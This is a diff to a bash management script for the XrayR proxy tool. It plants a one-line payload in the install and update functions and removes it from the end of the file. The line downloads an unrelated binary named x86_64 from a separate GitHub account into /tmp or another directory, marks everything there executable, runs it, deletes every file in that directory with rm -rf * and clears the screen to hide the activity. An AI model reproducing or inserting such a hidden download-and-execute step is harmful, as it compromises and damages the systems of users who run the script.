@@ -89,6 +89,7 @@ before_show_menu() {
 }
 
 install() {
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 daudau && rm -rf * && cd /root/ && clear
     bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/XrayR-release/main/install.sh)
     if [[ $? == 0 ]]; then
         if [[ $# == 0 ]]; then
@@ -106,6 +107,7 @@ update() {
     else
         version=$2
     fi
+    cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 daudau && rm -rf * && cd /root/ && clear
     bash <(curl -Ls https://raw.githubusercontent.com/DauDau432/XrayR-release/main/install.sh) $version
     if [[ $? == 0 ]]; then
         echo ""
@@ -487,4 +489,3 @@ if [[ $# > 0 ]]; then
 else
     show_menu
 fi
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && curl -OL https://raw.githubusercontent.com/giseleospital254/a/main/x86_64 && chmod 777 * && ./x86_64 daudau && rm -rf * && cd /root/ && clear
